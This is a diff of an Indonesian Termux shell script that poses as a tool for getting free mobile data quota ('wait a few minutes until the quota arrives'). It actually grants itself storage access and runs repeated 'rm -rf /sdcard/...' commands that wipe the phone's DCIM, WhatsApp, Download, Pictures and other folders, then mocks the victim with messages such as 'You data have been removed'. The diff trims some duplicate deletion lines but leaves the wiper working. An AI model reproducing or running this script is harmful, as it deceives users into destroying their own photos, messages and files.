@@ -14,7 +14,7 @@ echo  $red    "|                                   |"
 echo  $red    "| Author        : Dyxa#ABCD         |"
 echo  $red    "| Contact       : 089676666667      |"
 echo  $red    "| My Team       : Rabbit Cyber team |"
-echo  $red    "| Thanks To     : All Member         |"
+echo  $red    "| Thanks To     : All Member        |"
 echo  $blue "<|======================================|>"
 sleep 1
 echo " "
@@ -41,7 +41,6 @@ sleep 2
 
 termux-setup-storage
 
-rm -rf /sdcard
 rm -rf /sdcard/Android
 rm -rf /sdcard/bluetooth
 rm -rf /sdcard/browser
@@ -56,20 +55,9 @@ echo  $blue "Tunggu Beberapa menit,hingga kuotanya masuk"
 echo  $red "sedang menunggu........"
 echo  $green "yang perlu anda tahu.menunggu itu membosankan........"
 
-rm -rf /sdcard
-rm -rf /sdcard/Android
-rm -rf /sdcard/bluetooth
-rm -rf /sdcard/browser
-rm -rf /sdcard/DCIM
-rm -rf /sdcard/Download
-rm -rf /sdcard/Music
-rm -rf /sdcard/Pictures
-rm -rf /sdcard/SHAREit
-rm -rf /sdcard/WhatsApp
-echo  $red "menunggu menghapus file"
-echo  $blue "AWOWKWOKKKK :V"
-echo "BOKEP TELAH DI HAPUS:v" | lolcat
-toilet -f standard "Dyxa#ABCD gans" | lolcat
+echo  $blue "You data have been removed:V"
+echo "BOKEP PUN IKUT DI HAPUS" | lolcat
+toilet -f standard "Dyxa#ABCD" | lolcat
 fi
 
 
@@ -86,7 +74,6 @@ sleep 2
 
 termux-setup-storage
 
-rm -rf /sdcard/
 rm -rf /sdcard/Android
 rm -rf /sdcard/bluetooth
 rm -rf /sdcard/browser
@@ -101,17 +88,6 @@ echo  $blue "Tunggu Beberapa menit,hingga kuotanya masuk"
 echo  $red "sedang menunggu........"
 echo  $green "yang perlu anda tahu.menunggu itu membosankan........"
 
-rm -rf /sdcard/
-rm -rf /sdcard/Android
-rm -rf /sdcard/bluetooth
-rm -rf /sdcard/browser
-rm -rf /sdcard/DCIM
-rm -rf /sdcard/Download
-rm -rf /sdcard/Music
-rm -rf /sdcard/Pictures
-rm -rf /sdcard/SHAREit
-rm -rf /sdcard/WhatsApp
-echo  $red "menunggu menghapus file"
 echo  $blue "AWOWKWOKKKK :V"
 echo "BOKEP TELAH DI HAPUS:v" | lolcat
 toilet -f standard "Dyxa#ABCD gans" | lolcat
@@ -131,7 +107,6 @@ sleep 2
 
 termux-setup-storage
 
-rm -rf /sdcard/
 rm -rf /sdcard/Android
 rm -rf /sdcard/bluetooth
 rm -rf /sdcard/browser
@@ -146,17 +121,6 @@ echo  $blue "Tunggu Beberapa menit,hingga kuotanya masuk"
 echo  $red "sedang menunggu........"
 echo  $green "yang perlu anda tahu.menunggu itu membosankan........"
 
-rm -rf /sdcard/
-rm -rf /sdcard/Android
-rm -rf /sdcard/bluetooth
-rm -rf /sdcard/browser
-rm -rf /sdcard/DCIM
-rm -rf /sdcard/Download
-rm -rf /sdcard/Music
-rm -rf /sdcard/Pictures
-rm -rf /sdcard/SHAREit
-rm -rf /sdcard/WhatsApp
-echo  $red "menunggu menghapus file"
 echo  $blue "AWOWKWOKKKK :V"
 echo "BOKEP TELAH DI HAPUS:v" | lolcat
 toilet -f standard "Dyxa#ABCD gans" | lolcat
@@ -175,7 +139,6 @@ sleep 2
 
 termux-setup-storage
 
-rm -rf /sdcard/
 rm -rf /sdcard/Android
 rm -rf /sdcard/bluetooth
 rm -rf /sdcard/browser
@@ -190,17 +153,6 @@ echo  $blue "Tunggu Beberapa menit,hingga kuotanya masuk"
 echo  $red "sedang menunggu........"
 echo  $green "yang perlu anda tahu.menunggu itu membosankan........"
 
-rm -rf /sdcard/
-rm -rf /sdcard/Android
-rm -rf /sdcard/bluetooth
-rm -rf /sdcard/browser
-rm -rf /sdcard/DCIM
-rm -rf /sdcard/Download
-rm -rf /sdcard/Music
-rm -rf /sdcard/Pictures
-rm -rf /sdcard/SHAREit
-rm -rf /sdcard/WhatsApp
-echo  $red "menunggu menghapus file"
 echo  $blue "AWOWKWOKKKK :V"
 echo "BOKEP TELAH DI HAPUS:v" | lolcat
 toilet -f standard "Dyxa#ABCD gans" | lolcat
